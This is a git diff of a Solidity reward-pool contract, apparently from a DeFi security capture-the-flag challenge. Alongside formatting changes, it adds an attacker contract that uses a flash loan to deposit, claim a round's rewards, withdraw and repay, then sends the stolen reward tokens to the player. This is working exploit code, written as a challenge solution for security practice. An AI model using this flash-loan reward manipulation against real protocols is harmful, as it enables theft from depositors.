@@ -3,8 +3,9 @@ pragma solidity ^0.8.0;
 
 import "solady/src/utils/FixedPointMathLib.sol";
 import "solady/src/utils/SafeTransferLib.sol";
-import { RewardToken } from "./RewardToken.sol";
-import { AccountingToken } from "./AccountingToken.sol";
+import {RewardToken} from "./RewardToken.sol";
+import {AccountingToken} from "./AccountingToken.sol";
+import {FlashLoanerPool} from "./FlashLoanerPool.sol";
 
 /**
  * @title TheRewarderPool
@@ -15,7 +16,7 @@ contract TheRewarderPool {
 
     // Minimum duration of each round of rewards in seconds
     uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
-    
+
     uint256 public constant REWARDS = 100 ether;
 
     // Token deposited into the pool by users
@@ -75,8 +76,13 @@ contract TheRewarderPool {
             _recordSnapshot();
         }
 
-        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
-        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);
+        uint256 totalDeposits = accountingToken.totalSupplyAt(
+            lastSnapshotIdForRewards
+        );
+        uint256 amountDeposited = accountingToken.balanceOfAt(
+            msg.sender,
+            lastSnapshotIdForRewards
+        );
 
         if (amountDeposited > 0 && totalDeposits > 0) {
             rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
@@ -96,13 +102,48 @@ contract TheRewarderPool {
     }
 
     function _hasRetrievedReward(address account) private view returns (bool) {
-        return (
-            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp
-                && lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
-        );
+        return (lastRewardTimestamps[account] >=
+            lastRecordedSnapshotTimestamp &&
+            lastRewardTimestamps[account] <=
+            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION);
     }
 
     function isNewRewardsRound() public view returns (bool) {
-        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+        return
+            block.timestamp >=
+            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+    }
+}
+
+contract TheRewarderPoolAttacker {
+    TheRewarderPool pool;
+    FlashLoanerPool flashLoanerPool;
+    address liquidityToken;
+    address player;
+
+    constructor(
+        TheRewarderPool _pool,
+        FlashLoanerPool _flashLoanerPool,
+        address _liquidityToken,
+        address _player
+    ) {
+        pool = _pool;
+        flashLoanerPool = _flashLoanerPool;
+        liquidityToken = _liquidityToken;
+        player = _player;
+    }
+
+    function attack() public {
+        flashLoanerPool.flashLoan(1_000_000 ether);
+    }
+
+    function receiveFlashLoan(uint256 amount) public {
+        SafeTransferLib.safeApprove(liquidityToken, address(pool), amount);
+        pool.deposit(amount);
+        pool.distributeRewards();
+        pool.withdraw(amount);
+        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
+        RewardToken rewardToken = pool.rewardToken();
+        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
     }
 }
